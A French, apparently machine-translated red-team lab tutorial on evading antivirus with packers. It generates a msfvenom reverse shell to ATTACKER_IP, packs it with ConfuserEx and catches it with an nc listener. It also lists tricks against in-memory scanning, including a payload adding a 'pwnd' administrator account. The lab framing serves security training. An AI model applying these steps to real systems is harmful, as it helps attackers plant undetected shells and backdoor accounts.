Une autre méthode pour vaincre la détection AV sur disque consiste à utiliser un packer. Les packers sont des logiciels qui prennent un programme en entrée et le transforment pour que sa structure soit différente, mais que leurs fonctionnalités restent exactement les mêmes. Les emballeurs le font avec deux objectifs principaux en tête :

-   Compressez le programme pour qu'il prenne moins de place.
-   Protégez le programme de l'ingénierie inverse en général.

Les packers sont couramment utilisés par les développeurs de logiciels qui souhaitent protéger leurs logiciels contre l'ingénierie inverse ou le piratage. Ils atteignent un certain niveau de protection en implémentant un mélange de transformations incluant la compression, le chiffrement, l'ajout de protections contre le débogage et bien d'autres. Comme vous l'avez peut-être déjà deviné, les packers sont également couramment utilisés pour masquer les logiciels malveillants sans trop d'effort.

Il existe un grand nombre de conditionneurs, notamment UPX, MPRESS, Themida et bien d'autres.

## Emballage d'une application

Bien que chaque emballeur fonctionne différemment, regardons un exemple de base de ce que ferait un simple emballeur.

Lorsqu'une application est compressée, elle sera transformée d'une manière ou d'une autre à l'aide d'une fonction de compression . La fonction d'empaquetage doit être capable de masquer et de transformer le code d'origine de l'application de manière à pouvoir être raisonnablement inversée par une fonction de décompression afin que la fonctionnalité d'origine de l'application soit préservée. Bien que parfois le packer puisse ajouter du code (pour rendre le débogage de l'application plus difficile, par exemple), il souhaitera généralement pouvoir récupérer le code original que vous avez écrit lors de son exécution.

![9aacb2fab2a656ffc82a7b0344918062](https://github.com/dsgsec/Red-Team/assets/82456829/99d98153-3e09-4858-8499-e076d24222ad)


La version compressée de l'application contiendra votre code d'application compressé. Étant donné que ce nouveau code compressé est masqué, l'application doit pouvoir en décompresser le code d'origine. À cette fin, le packer intégrera un stub de code contenant un décompresseur et y redirigera le point d'entrée principal de l'exécutable.

Lorsque votre application compressée est exécutée, les événements suivants se produisent :

![408fb909374c2b54bebef9809eaa417a](https://github.com/dsgsec/Red-Team/assets/82456829/29d547f4-7a40-40a4-b230-0a923811bff1)


1.  Le décompresseur est exécuté en premier, car il constitue le point d'entrée de l'exécutable.
2.  Le décompresseur lit le code de l'application compressée.
3.  Le décompresseur écrira le code décompressé d'origine quelque part en mémoire et y dirigera le flux d'exécution de l'application.

Packers et AV

Nous pouvons désormais voir comment les packers aident à contourner les solutions audiovisuelles . Disons que vous avez créé un exécutable shell inversé, mais que l'antivirus le détecte comme malveillant car il correspond à une signature connue. Dans ce cas, l'utilisation d'un packer transformera l'exécutable du shell inversé afin qu'il ne corresponde à aucune signature connue sur le disque. En conséquence, vous devriez pouvoir distribuer votre charge utile sur le disque de n'importe quelle machine sans trop de problème.

Cependant, les solutions audiovisuelles peuvent toujours intercepter votre application compressée pour plusieurs raisons :

-   Bien que votre code d'origine puisse être transformé en quelque chose de méconnaissable, n'oubliez pas que l'exécutable compressé contient un stub avec le code du décompresseur. Si le décompresseur a une signature connue, les solutions antivirus peuvent toujours signaler tout exécutable compressé en se basant uniquement sur le stub du décompresseur.
-   À un moment donné, votre application décompressera le code original en mémoire afin qu'il puisse être exécuté. Si la solution antivirus que vous essayez de contourner peut effectuer des analyses en mémoire, vous pourriez toujours être détecté une fois votre code décompressé.

Emballer notre shellcode

Commençons par un shellcode C# de base. Vous pouvez également trouver ce code sur votre machine Windows à l'adresse`C:\Tools\CS Files\UnEncStagelessPayload.cs` :

*Code de charge utile complet (cliquez pour lire)*

Cette charge utile prend un shellcode généré par msfvenom et l'exécute dans un thread séparé. Pour que cela fonctionne, vous devrez générer un nouveau shellcode et le mettre dans la `shellcode`variable du code :

Invite de commande

```
C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
```

Vous pouvez ensuite compiler votre charge utile sur la machine Windows à l'aide de la commande suivante :

Invite de commande

```
C:\> csc UnEncStagelessPayload.cs
```

Une fois que vous disposez d'un exécutable fonctionnel, vous pouvez essayer de le télécharger sur THM Antivirus Check ! page (lien sur le bureau). Il doit être signalé immédiatement par l' AV . Utilisons un packer sur la même charge utile et voyons ce qui se passe.

Nous utiliserons le packer [ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0) pour cette tâche, car nos charges utiles sont programmées sur `.NET`. Pour votre commodité, vous pouvez trouver un raccourci sur votre bureau.

ConfuserEx vous demandera d'indiquer les dossiers dans lesquels il fonctionnera. Assurez-vous de sélectionner votre bureau comme répertoire de base, comme indiqué dans l'image ci-dessous. Une fois le répertoire de base configuré, faites glisser et déposez l'exécutable que vous souhaitez compresser sur l'interface, et vous devriez vous retrouver avec ce qui suit :

![9214df2a88ffffbf8561502aa19a375c](https://github.com/dsgsec/Red-Team/assets/82456829/7439789b-fa3d-4221-b3b1-757054b8f62f)

Allons dans l'onglet Paramètres et sélectionnons notre charge utile. Une fois sélectionné, appuyez sur le bouton « + » pour ajouter des paramètres à votre charge utile. Cela devrait créer une règle nommée « true ». Assurez-vous également d'activer la compression :

![857e5540e14f4ebf743fbd4d2f8ee503](https://github.com/dsgsec/Red-Team/assets/82456829/d7693531-4aeb-4ac7-a8a6-db513c916e45)

Nous allons maintenant éditer la « vraie » règle et la définir sur le préréglage Maximum :

![96946f1aff585a91e78408b96e446ea4](https://github.com/dsgsec/Red-Team/assets/82456829/c8d7f693-de7e-4ed9-80fe-29e68e68b80a)

Enfin, nous passerons à l'onglet « Protéger ! » et cliquez sur "Protéger" :

![e0e3ca97245641d3954f26fa986aae87](https://github.com/dsgsec/Red-Team/assets/82456829/182fea07-ffc7-4de1-9326-1363ff124f60)

La nouvelle charge utile devrait être prête et, espérons-le, ne déclenchera aucune alarme une fois téléchargée sur THM Antivirus Checker ! (raccourci disponible sur votre bureau). En fait, si vous exécutez votre charge utile et configurez un `nc`écouteur, vous devriez pouvoir récupérer un shell :

Boîte d'attaque

```
user@attackbox$ nc -lvp 7478
```

Jusqu'ici, tout va bien, mais rappelez-vous que nous avons parlé des antivirus effectuant une analyse en mémoire ? Si vous essayez d'exécuter une commande sur votre shell inversé, l'AV remarquera votre shell et le tuera. En effet, Windows Defender interceptera certains appels d'API Windows et effectuera une analyse en mémoire chaque fois que de tels appels d'API sont utilisés. Dans le cas d'un shell généré avec msfvenom, CreateProcess() sera invoqué et détecté.

Donc que faisons-nous maintenant?

Bien que l'échec de l'analyse en mémoire dépasse le cadre de cette salle, vous pouvez prendre quelques mesures simples pour éviter la détection :

-   Attendez juste un peu . Essayez à nouveau de générer le shell inversé et attendez environ 5 minutes avant d'envoyer une commande. Vous verrez que l' AV ne se plaindra plus. La raison en est que l'analyse de la mémoire est une opération coûteuse. Par conséquent, l'AV le fera pendant un certain temps après le démarrage de votre processus, mais finira par s'arrêter.
-   Utilisez des charges utiles plus petites . Plus la charge utile est petite, moins elle a de chances d'être détectée. Si vous utilisez msfvenom pour exécuter une seule commande au lieu d'un shell inversé, l' AV aura plus de mal à la détecter. Vous pouvez essayer avec`msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp` et voir ce qui se passe.

Si la détection ne pose pas de problème, vous pouvez même utiliser une astuce simple. Depuis votre shell inversé, réexécutez `cmd.exe`. L' AV détectera votre charge utile et tuera le processus associé, mais pas le nouveau cmd.exe que vous venez de générer.

Bien que chaque AV se comporte différemment, la plupart du temps, il y aura une manière similaire de les contourner, il vaut donc la peine d'explorer tous les comportements étranges que vous remarquez lors des tests.
